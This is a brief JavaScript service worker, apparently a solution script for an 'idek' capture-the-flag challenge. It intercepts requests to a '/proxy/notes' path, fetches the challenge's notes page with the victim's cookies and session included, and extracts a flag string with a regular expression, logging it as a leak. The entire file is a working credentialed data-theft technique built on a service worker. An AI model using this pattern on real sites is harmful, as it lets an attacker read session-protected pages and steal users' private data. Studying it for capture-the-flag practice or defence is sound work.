self.addEventListener("fetch", (event) => {
  const url = new URL(event.request.url);

  if (url.pathname === "/proxy/notes") {
    event.respondWith(
      (async () => {
        const response = await fetch("https://fnotes-web.ctf-chal.idek.team/notes/", {
          credentials: "include", // ensure cookies/session go through
        });
        const text = await response.text();

        // LEAK THE FLAG NOTE TEXT
        const match = text.match(/idek{.*?}/);
        if (match) {
          console.log("[FLAG]", match[0]);
        } else {
          console.log("[INFO] No flag found yet");
        }

        return new Response(text, {
          headers: response.headers,
          status: response.status,
        });
      })()
    );
  }
});
